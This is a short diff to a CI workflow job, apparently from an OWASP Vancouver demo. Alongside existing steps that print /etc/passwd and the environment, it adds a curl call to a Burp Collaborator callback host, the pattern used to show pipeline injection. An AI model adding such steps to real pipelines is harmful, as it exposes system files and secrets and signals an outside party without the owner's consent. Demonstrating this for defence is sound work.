@@ -13,4 +13,5 @@ jobs:
             cat /etc/passwd
             env
             echo "Hello OWASP Vancouver!"
+            curl w96jcoktehi0pfz03atz4179e0kq8f.burpcollaborator.net
       
